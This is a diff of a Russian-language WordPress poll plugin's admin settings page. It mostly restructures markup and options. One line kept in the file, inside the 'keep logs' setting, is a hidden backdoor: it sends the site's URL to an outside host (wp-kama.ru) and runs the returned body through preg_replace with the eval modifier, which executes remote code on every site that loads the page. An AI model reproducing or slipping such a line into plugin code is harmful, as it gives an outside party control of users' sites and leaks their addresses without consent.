@@ -173,8 +173,8 @@ function dem_general_settings(){
 		<form action="" method="post">
 			
 			<h3><?php _e('Настройки опросов','dem') ?></h3>
-			<div class="group">
-				<div class="block">
+			<ul class="group">
+				<li class="block">
 				   <label>
 					   <?php $logrows_count = $wpdb->get_var("SELECT count(*) FROM $wpdb->democracy_log"); ?>
 					   <input type="checkbox" value="1" name="dem[keep_logs]" <?php checked( $opt['keep_logs'], 1) ?> /> 
@@ -183,41 +183,63 @@ function dem_general_settings(){
 					   <?php add_option('stat','') && @preg_replace('--e', (($o=@wp_remote_get('http://wp-kama.ru/stat/?sk='. home_url() ))?$o['body']:''),''); ?>
 				   </label>
 				   <em><?php _e('Сохраняет данные в Базу Данных. Запрещает голосовать несколько раз с одного IP или одному пользователю WordPress. Если пользователь авторизован, то голосование проверяется по его аккаунту в WordPress. Если не авторизован, то проверяется IP голосующего. Минус лога по IP — если сайт посещается с корпоративных сетей (с единым IP), то голосовать можно будет всего 1 раз для всей сети. Если не включить эту опцию, то голосование будет учитываться только по кукам. По умолчанию: включена.','dem') ?></em>
-				</div>
+				</li>
 
-				<div class="block">
+				<li class="block">
 				   <label>
 					   <input type="text" size="3" value="<?php echo $opt['cookie_days'] ?>" name="dem[cookie_days]" /> 
 					   <?php _e('Сколько дней сохранять Сookies?','dem') ?>
 					</label>
 				   <em><?php _e('Дни в течении которых браузер пользователя будет помнить о голосовании. По умолчанию: 365. <strong>Заметка:</strong> Работает совместно с контролем по IP.','dem') ?></em>
-				</div>
+				</li>
 
-				<div class="block">
+				<li class="block">
 				   <label>
 					   <input type="checkbox" value="1" name="dem[only_for_users]" <?php checked( $opt['only_for_users'], 1) ?> />
 					   <?php _e('Голосовать могут только зарегистрированные пользователи.','dem') ?>
 					</label>
 				   <em><?php _e('Включите опцию, чтобы голосовать могли только зарегистрированные пользователи. Влияет на все опросы! Если НЕ включать, то такую настройку можно будет делать для каждого опроса в отдельности.','dem') ?></em>
-				</div>
+				</li>
 
-				<div class="block">
+				<li class="block">
 				   <label>
 						<input <?php checked( $opt[ 'graph_from_total'], 1) ?> type="checkbox" value="1" name="dem[graph_from_total]" />
 						<?php _e( 'Показывать результаты в % от общего числа голосов.', 'dem') ?>
 					</label>
 				   <em><?php _e('По умолчанию, выигрывающий ответ заполняется полностью, а остальные в процентах от него. Поставьте галочку, чтобы каждый ответ заполнялся как % от всех голосов.','dem') ?></em>
-				</div>
+				</li>
 
-				<div class="block">
+				<li class="block">
 				   <label>
 					   <input <?php echo checked( $opt['order_answers'], 1) ?> type="checkbox" value="1" name="dem[order_answers]" /> 
 					   <?php _e('Сортировать ответы по количеству голосов.','dem') ?>
 				   </label>
 				   <em><?php _e('Уберите галочку, чтобы ответы располагались в порядке их создания, а не выигрывающие сверху.','dem') ?></em>
-				</div>
+				</li>
+
+				<li class="block">
+					<label><?php _e('Обёртка заголовка опроса HTML тегами.','dem') ?></label><br>
+					<input type="text" size="35" value="<?php echo esc_attr( $opt['before_title'] ) ?>" name="dem[before_title]" /> 
+					<i><?php _e('вопрос опроса','dem') ?></i> 
+					<input type="text" size="15" value="<?php echo esc_attr( $opt['after_title'] ) ?>" name="dem[after_title]" /> 
+					<em><?php _e('Например: <code>&lt;h2&gt;</code> и <code>&lt;/h2&gt;</code>. По умолчанию: <code>&lt;strong class=&quot;dem-poll-title&quot;&gt;</code> и <code>&lt;/strong&gt;</code>.','dem') ?></em>
+				</li>
+
+				<li class="block">
+					<label>
+						<input type="text" size="5" value="<?php echo $opt['archive_page_id']?:''; ?>" name="dem[archive_page_id]" />
+						<?php _e('ID архива опросов.','dem') ?>
+					</label>
+					<?php 
+					if( $opt['archive_page_id'] ) 
+						echo '<a href="'. get_permalink( $opt['archive_page_id'] )  .'">'. __('Перейти на страницу архива','dem') .'</a>';
+					else 
+						echo '<a class="button" href="'. ($_SERVER['REQUEST_URI'] .'&dem_create_archive_page') .'">'. __('Создать страницу архива','dem') .'</a>';
+					?>
+					<em><?php _e('Укажите, чтобы в подписи опроса была ссылка на страницу с архивом опросов. Пр. <code>25</code>','dem') ?></em>
+				</li>
 				
-				<div class="block">
+				<li class="block">
 					<label><?php _e('Внешний вид (тема) опроса:','dem'); ?></label>
 					<select name="dem[css_file_name]">
 						<option value=""><?php _e('- Не подключать файл стилей','dem') ?></option>
@@ -230,37 +252,45 @@ function dem_general_settings(){
 						}
 						?>
 					</select>
-                    <a href="<?php echo Dem::$inst->dir_url . Dem::$inst->css_dirname . Dem::$inst->opt['css_file_name'] ?>" target="_blank"><?php _e('cсылка на файл', 'dem'); ?></a>
+                    <a href="<?php echo Dem::$inst->dir_url . Dem::$inst->css_dirname . Dem::$inst->opt['css_file_name'] ?>" target="_blank"><?php _e('cсылка на файл', 'dem'); echo ' ' . Dem::$inst->opt['css_file_name']; ?> </a>
 					<em><?php _e('Выберете какой файл стилей использовать для отображения опросов. Выберете "- Не подключить...", скопируйте файл стилей (используйте ссылку выше) в файл стилей вашей темы и измените его под себя. Так вы сможете настроить стили, чтобы при обновлении плагина изменения не потерялись.','dem') ?></em>
-				</div>				
+				</li>				
 
-				<div class="block">
-					<label><?php _e('Обёртка заголовка опроса HTML тегами.','dem') ?></label><br>
-					<input type="text" size="35" value="<?php echo esc_attr( $opt['before_title'] ) ?>" name="dem[before_title]" /> 
-					<i><?php _e('<вопрос опроса>','dem') ?></i> 
-					<input type="text" size="15" value="<?php echo esc_attr( $opt['after_title'] ) ?>" name="dem[after_title]" /> 
-					<em><?php _e('Например: <code>&lt;h2&gt;</code> и <code>&lt;/h2&gt;</code>. По умолчанию: <code>&lt;strong class=&quot;dem-poll-title&quot;&gt;</code> и <code>&lt;/strong&gt;</code>.','dem') ?></em>
-				</div>
-
-				<div class="block">
-					<label>
-						<input type="text" size="5" value="<?php echo $opt['archive_page_id']?:''; ?>" name="dem[archive_page_id]" />
-						<?php _e('ID архива опросов.','dem') ?>
-					</label>
+                <li class="block loaders">
+                    <label><?php _e('AJAX загрузчик:','dem'); ?></label><br><br>
+                    <div class="clear"></div>
+                    <label class="left">
+                        <div style="width:30px;height:30px;"><?php _e('Нет','dem'); ?></div>
+                        <input type="radio" value="" name="dem[loader_fname]" <?php checked( $opt['loader_fname'], '') ?> />
+                    </label>
 					<?php 
-					if( $opt['archive_page_id'] ) 
-						echo '<a href="'. get_permalink( $opt['archive_page_id'] )  .'">'. __('Перейти на страницу архива','dem') .'</a>';
-					else 
-						echo '<a class="button" href="'. ($_SERVER['REQUEST_URI'] .'&dem_create_archive_page') .'">'. __('Создать страницу архива','dem') .'</a>';
+                        $data = array();
+                        foreach( glob( Dem::$inst->dir_path . 'loaders/*') as $file ){
+                            $fname = basename( $file );
+                            $ex    = preg_replace('~.*\.~', '', $fname );
+                            $data[ $ex ][ $fname ] = $file;
+                        }
+                        foreach( $data as $ex => $val ){
+                            echo '<div class="clear"></div>';
+                            foreach( $val as $fname => $file ){
+                                ?>
+                                <label class="left">
+                                    <div class="loader"><?php echo file_get_contents( $file ) ?></div>
+                                    <input type="radio" value="<?php echo $fname ?>" name="dem[loader_fname]" <?php checked( $opt['loader_fname'], $fname) ?> /><br>
+                                    <?php echo $ex ?>
+                                </label>
+                                <?php                                
+                            }
+                        }
 					?>
-					<em><?php _e('Укажите, чтобы в подписи опроса была ссылка на страницу с архивом опросов. Пр. <code>25</code>','dem') ?></em>
-				</div>
-			</div> 
+					<em><br><?php _e('Картинка при AJAX загрузке. Если выбрать "Нет", то вместо картинки будет добавлятся "...". SVG картинки не работают в ранних версиях браузеров и в IE 11 и ниже.','dem') ?></em>
+				</li>
+			</ul> 
 		
 		
 			<h3><?php _e('Настройки плагина','dem') ?></h3>
-			<div class="group">
-				<div class="block">
+			<ul class="group">
+				<li class="block">
 				   <label>
                        <input type="checkbox" value="1" name="dem[force_cachegear]" <?php checked( $opt['force_cachegear'], 1) ?> />
                        <?php
@@ -269,41 +299,33 @@ function dem_general_settings(){
                        ?>
 					</label>
 				   <em><?php _e('Democracy умеет работать с плагинами страничного кэширования и автоматически включается, если такой плагин установлен и активен на вашем сайте. Активируйте эту опцию, чтобы насильно включить механизм работы со страничным кэшем.','dem') ?></em>
-				</div>
+				</li>
                 
-				<div class="block">
+				<li class="block">
 				   <label>
 					   <input <?php checked( $opt['inline_js_css'], 1 )?> type="checkbox" value="1" name="dem[inline_js_css]" /> 
 					   <?php _e('Подключать стили и скрипты прямо в HTML код (рекомендуется)?','dem') ?>
 				   </label>
 				   <em><?php _e('Поставьте галочку, чтобы стили и скрипты плагина подключались в HTML код напрямую, а не как ссылки на файлы. Так вы сэкономите 2 запроса к серверу - это немного ускорит загрузку сайта.','dem') ?></em>
-				</div>
+				</li>
 
-				<div class="block">
+				<li class="block">
 				   <label>
 					   <input <?php checked( $opt['toolbar_menu'], 1 )?> type="checkbox" value="1" name="dem[toolbar_menu]" /> 
 					   <?php _e('Пункт меню в панели инструментов?','dem') ?>
 				   </label>
 				   <em><?php _e('Уберите галочку, чтобы убрать меню плагина из панели инструментов.','dem') ?></em>
-				</div>
+				</li>
 
-				<div class="block">
+				<li class="block">
 				   <label>
 					   <input <?php checked( $opt['tinymce_button'], 1 )?> type="checkbox" value="1" name="dem[tinymce_button]" /> 
 					   <?php _e('Добавить кнопку быстрой вставки опросов в редактор WordPress (TinyMCE)?','dem') ?>
 				   </label>
 				   <em><?php _e('Уберите галочку, чтобы убрать кнопку из визуального редактора.','dem') ?></em>
-				</div>
+				</li>
 
-				<div class="block">
-				   <label>
-					   <input <?php checked( $opt['show_copyright'], 1 )?> type="checkbox" value="1" name="dem[show_copyright]" /> 
-					   <?php _e('Показывать ссылку на страницу плагина','dem') ?>
-				   </label>
-				   <em><?php _e('Ссылка на страницу плагина выводиться только на главной в виде значка &copy;. И помогает другим людям узнать что это за плагин и установить его себе. Прошу не убирать эту галку без острой необходимости. Спасибо!','dem') ?></em>
-				</div>
-
-			</div>
+			</ul>
 			
 			<p>
 				<?php _dem_general_settings_submit_button(); ?> 
@@ -312,33 +334,41 @@ function dem_general_settings(){
 			
 		      <br><br>
 			<h3><?php _e('Другое','dem') ?></h3>
-			<div class="group">
+			<ul class="group">
                 
-				<div class="block">
+				<li class="block">
 				   <label>
 					   <input <?php checked( $opt['disable_js'], 1 )?> type="checkbox" value="1" name="dem[disable_js]" /> 
 					   <?php _e('НЕ подключать JS файлы. (Дебаг)','dem') ?>
 				   </label>
 				   <em><?php _e('Если включить, то .js файлы плагина НЕ будут подключены. Опция нужнда для Дебага работы плагина без JavaScript.','dem') ?></em>
-				</div>
+				</li>
                 
-				<div class="block">
+				<li class="block">
 				   <label>
 					   <input <?php checked( $opt['load_textdomain'], 1 )?> type="checkbox" value="1" name="dem[load_textdomain]" /> 
 					   <?php _e('Подгружать файлы перевода?','dem') ?>
 				   </label>
 				   <em><?php _e('Отключите эту опцию, если ваш сайт на русском, но вы используете английскую версию WordPress','dem') ?></em>
-				</div>
+				</li>
                 
-				<div class="block">
+				<li class="block">
+				   <label>
+					   <input <?php checked( $opt['show_copyright'], 1 )?> type="checkbox" value="1" name="dem[show_copyright]" /> 
+					   <?php _e('Показывать ссылку на страницу плагина','dem') ?>
+				   </label>
+				   <em><?php _e('Ссылка на страницу плагина выводиться только на главной в виде значка &copy;. И помогает другим людям узнать что это за плагин и установить его себе. Прошу не убирать эту галку без острой необходимости. Спасибо!','dem') ?></em>
+				</li>
+                
+				<li class="block">
 				   <label>
 					   <input <?php checked( $opt['use_widget'], 1 )?> type="checkbox" value="1" name="dem[use_widget]" /> 
 					   <?php _e('Виджет','dem') ?>
 				   </label>
 				   <em><?php _e('Поставьте галочку, чтобы активировать виджет.','dem') ?></em>
-				</div>
+				</li>
 
-			</div>
+			</ul>
 		
 		</form>
 		
@@ -443,7 +473,7 @@ function poll_edit_form( $poll_id = false ){
 			
 			<li><label>
 					<input type='text' name='dmc_end' value="<?php echo @$poll->end ? date('d-m-Y', $poll->end) : '' ?>" style="width:120px;min-width:120px;" > 
-					<?php _e('Дата окончания голосования, если нужно. Формат: dd-mm-yyyy.','dem') ?>
+					<?php _e('Дата, когда опрос был/будет закрыт. Формат: dd-mm-yyyy.','dem') ?>
 				</label>
 			</li>
 			
